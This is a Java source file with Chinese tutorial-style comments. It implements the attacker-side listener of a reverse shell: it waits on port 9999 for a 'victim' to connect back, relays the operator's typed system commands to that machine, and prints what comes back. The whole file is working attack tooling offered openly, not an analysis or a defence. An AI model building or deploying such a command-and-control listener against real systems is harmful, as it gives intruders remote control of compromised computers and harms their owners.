import java.io.*;
import java.net.*;
import java.util.Scanner;

public class ReverseShellServer {
    public static void main(String[] args) throws IOException {
        // 1. 启动监听
        ServerSocket server = new ServerSocket(9999);
        System.out.println("[*] 攻击服务端已启动，监听本地 9999 端口...");
        System.out.println("[*] 正在等待受害者 (Victim) 反弹 Shell 上线...");

        // 2. 阻塞等待受害者连接
        Socket victim = server.accept();
        System.out.println("[+] 叮！受害者已上线！IP: " + victim.getInetAddress());

        // 3. 拿到听筒和话筒
        // 注意：Windows 系统的 cmd 默认编码是 GBK，如果受害者是 Windows，这里用 GBK 防止中文乱码
        BufferedReader in = new BufferedReader(new InputStreamReader(victim.getInputStream(), "GBK"));
        PrintWriter out = new PrintWriter(victim.getOutputStream(), true);

        // ================== 【核心魔法：多线程并发】 ==================
        // 我们新开一个线程（打工人），它的唯一任务就是：死死把听筒贴在耳朵上，
        // 只要受害者发来了命令执行结果，就立刻打印到屏幕上！
        new Thread(() -> {
            try {
                String line;
                // 不断读取受害者的回显
                while ((line = in.readLine()) != null) {
                    System.out.println(line);
                }
            } catch (IOException e) {
                System.out.println("[-] 受害者已断开连接。");
            }
        }).start();
        // ==============================================================

        // 4. 主线程（包工头）的任务：读取你的键盘输入，当作命令发给受害者
        Scanner scanner = new Scanner(System.in);
        while (true) {
            String cmd = scanner.nextLine(); // 读取你敲的系统命令，比如 "whoami" 或 "ipconfig"
            out.println(cmd);                // 通过话筒发给受害者

            if ("exit".equalsIgnoreCase(cmd)) {
                break;
            }
        }

        // 5. 打扫战场
        victim.close();
        server.close();
        scanner.close();
        System.out.println("[*] 服务端关闭。");
    }
}